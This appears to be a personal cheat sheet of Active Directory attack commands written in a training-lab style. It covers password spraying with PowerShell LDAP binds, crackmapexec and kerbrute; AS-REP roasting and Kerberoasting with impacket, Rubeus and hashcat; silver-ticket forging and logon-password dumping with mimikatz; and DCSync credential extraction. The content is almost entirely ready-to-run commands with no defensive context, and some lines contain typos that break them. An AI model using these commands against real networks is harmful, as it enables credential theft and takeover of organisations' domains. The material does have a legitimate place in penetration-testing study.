### Password attacks
```
net accounts
- Check password/lockout policy

LDAP & ADSI (low and slow)
- $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
- $PDC = ($domainObj.PdcRoleOwner).Name
- $SearchString = "LDAP://"
- $SearchString += $PDC + "/"
- $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
- $SearchString += $DistinguishedName
- New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
	- Success looks like:
		- distinguishedName : {DC=corp,DC=com}
		- Path              : LDAP://DC1.corp.com/DC=corp,DC=com

	- Alternatively use .\Spray-Passowrds.ps1 -Pass <password> -Admin

crackmapexec
- crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

kerberute
- kerbrute passwordpsray -d corp.com usernames.txt "password"
- .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!
```

### AS-REP Roasting
```
- impacket-GetNPUsers -dc-ip <IP address> -request -outputfile <filename> corp.com/pete
On windows (no auth required) - Rubeus

- If this fails and we have GenericWrite/GenericAll permissions, just reset peoples passwords (Targeted AS-REP Roasting)
	- Can also modify User Account Control value
```

## Kerberoasting
```
- Externally: sudo impacket-GetUserSPNs -request -dc-ip <DC's IP> corp.com/pete
- Internally: rubeus.com kerberoast /outfile:outfile-name

- sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver Tickets
```
- mimikatz
	- privilege::debug
	- sekurlsa::logonpasswords
		- steal NTLM hash of service you want to access
- whoami /user
	- steal the SID starting with S at the start but not includin the (4 digit?) RID at the end
- kerberos::golden /sid:<sid> k/domain:corp.com /ptt /target:web04.corp.com /service:http rc4:<IIS NTLM hash> /user:>username>
- in powershell: klist
	- check current tickets
```


## DC Controller Sync
```
- mimikatz # lsadump::dcsync /user:corp\Administrator
- externally: impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Password"@<DC IP>
```